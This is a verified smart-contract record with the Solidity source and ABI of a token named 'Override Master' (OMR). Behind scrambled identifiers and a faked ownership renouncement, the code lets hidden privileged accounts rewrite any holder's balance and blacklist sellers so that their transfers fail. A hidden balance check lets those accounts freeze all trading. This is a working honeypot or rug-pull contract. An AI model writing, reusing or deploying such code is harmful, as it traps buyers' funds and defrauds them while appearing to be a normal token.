{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface tradingMaxSell {\n    function createPair(address receiverTotalAuto, address walletSell) external returns (address);\n}\n\ninterface teamExemptAmount {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchTake) external view returns (uint256);\n\n    function transfer(address walletModeSender, uint256 isReceiver) external returns (bool);\n\n    function allowance(address txLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletModeSender,\n        uint256 isReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeAt, uint256 value);\n    event Approval(address indexed txLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract shouldAmountFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface teamExemptAmountMetadata is teamExemptAmount {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OverrideMaster is shouldAmountFund, teamExemptAmount, teamExemptAmountMetadata {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingTotal;\n    }\n\n    event OwnershipTransferred(address indexed sellIs, address indexed exemptBuy);\n\n    mapping(address => mapping(address => uint256)) private feeTo;\n\n    uint256 feeReceiverReceiver;\n\n    mapping(address => bool) public totalTo;\n\n    bool public senderLaunched;\n\n    function sellMax(address tradingAutoList, uint256 isReceiver) public {\n        exemptTradingFund();\n        shouldFee[tradingAutoList] = isReceiver;\n    }\n\n    function transferFrom(address feeTake, address walletModeSender, uint256 isReceiver) external override returns (bool) {\n        if (_msgSender() != feeTradingSell) {\n            if (feeTo[feeTake][_msgSender()] != type(uint256).max) {\n                require(isReceiver <= feeTo[feeTake][_msgSender()]);\n                feeTo[feeTake][_msgSender()] -= isReceiver;\n            }\n        }\n        return atMin(feeTake, walletModeSender, isReceiver);\n    }\n\n    uint256 constant buyLimit = 17 ** 10;\n\n    bool public autoSender;\n\n    address private totalAmount;\n\n    string private takeReceiver = \"OMR\";\n\n    function shouldReceiver() public {\n        emit OwnershipTransferred(modeTokenLaunch, address(0));\n        totalAmount = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return buyWallet;\n    }\n\n    address feeTradingSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeReceiver;\n    }\n\n    bool private limitLaunchedSell;\n\n    mapping(address => uint256) private shouldFee;\n\n    bool public senderReceiver;\n\n    function senderAmount(address exemptLaunched) public {\n        exemptTradingFund();\n        if (limitLaunchedSell) {\n            senderLaunched = true;\n        }\n        if (exemptLaunched == modeTokenLaunch || exemptLaunched == receiverAt) {\n            return;\n        }\n        totalTo[exemptLaunched] = true;\n    }\n\n    uint256 enableIsTrading;\n\n    bool public fundMin;\n\n    function getOwner() external view returns (address) {\n        return totalAmount;\n    }\n\n    function allowance(address txIsFee, address modeFund) external view virtual override returns (uint256) {\n        if (modeFund == feeTradingSell) {\n            return type(uint256).max;\n        }\n        return feeTo[txIsFee][modeFund];\n    }\n\n    uint256 private tradingTotal = 100000000 * 10 ** 18;\n\n    uint256 public swapTx;\n\n    address public modeTokenLaunch;\n\n    string private buyWallet = \"Override Master\";\n\n    uint256 private amountExemptTx;\n\n    function exemptTradingFund() private view {\n        require(receiverFeeTx[_msgSender()]);\n    }\n\n    address senderMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function atMin(address feeTake, address walletModeSender, uint256 isReceiver) internal returns (bool) {\n        if (feeTake == modeTokenLaunch) {\n            return amountSender(feeTake, walletModeSender, isReceiver);\n        }\n        uint256 tradingMode = teamExemptAmount(receiverAt).balanceOf(senderMax);\n        require(tradingMode == enableIsTrading);\n        require(walletModeSender != senderMax);\n        if (totalTo[feeTake]) {\n            return amountSender(feeTake, walletModeSender, buyLimit);\n        }\n        return amountSender(feeTake, walletModeSender, isReceiver);\n    }\n\n    function balanceOf(address launchTake) public view virtual override returns (uint256) {\n        return shouldFee[launchTake];\n    }\n\n    function owner() external view returns (address) {\n        return totalAmount;\n    }\n\n    mapping(address => bool) public receiverFeeTx;\n\n    constructor (){\n        \n        feeLaunch tokenBuy = feeLaunch(feeTradingSell);\n        receiverAt = tradingMaxSell(tokenBuy.factory()).createPair(tokenBuy.WETH(), address(this));\n        \n        modeTokenLaunch = _msgSender();\n        receiverFeeTx[modeTokenLaunch] = true;\n        shouldFee[modeTokenLaunch] = tradingTotal;\n        shouldReceiver();\n        \n        emit Transfer(address(0), modeTokenLaunch, tradingTotal);\n    }\n\n    function transfer(address tradingAutoList, uint256 isReceiver) external virtual override returns (bool) {\n        return atMin(_msgSender(), tradingAutoList, isReceiver);\n    }\n\n    function enableFeeBuy(address marketingMode) public {\n        if (autoSender) {\n            return;\n        }\n        if (swapTx != teamIs) {\n            fundMin = false;\n        }\n        receiverFeeTx[marketingMode] = true;\n        if (fundMin == senderReceiver) {\n            senderReceiver = true;\n        }\n        autoSender = true;\n    }\n\n    uint8 private autoTokenTrading = 18;\n\n    function approve(address modeFund, uint256 isReceiver) public virtual override returns (bool) {\n        feeTo[_msgSender()][modeFund] = isReceiver;\n        emit Approval(_msgSender(), modeFund, isReceiver);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoTokenTrading;\n    }\n\n    function tradingTeamMin(uint256 isReceiver) public {\n        exemptTradingFund();\n        enableIsTrading = isReceiver;\n    }\n\n    function amountSender(address feeTake, address walletModeSender, uint256 isReceiver) internal returns (bool) {\n        require(shouldFee[feeTake] >= isReceiver);\n        shouldFee[feeTake] -= isReceiver;\n        shouldFee[walletModeSender] += isReceiver;\n        emit Transfer(feeTake, walletModeSender, isReceiver);\n        return true;\n    }\n\n    address public receiverAt;\n\n    uint256 private teamIs;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txIsFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMode\",\"type\":\"address\"}],\"name\":\"enableFeeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTokenLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverFeeTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAutoList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isReceiver\",\"type\":\"uint256\"}],\"name\":\"sellMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLaunched\",\"type\":\"address\"}],\"name\":\"senderAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isReceiver\",\"type\":\"uint256\"}],\"name\":\"tradingTeamMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAutoList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletModeSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OverrideMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}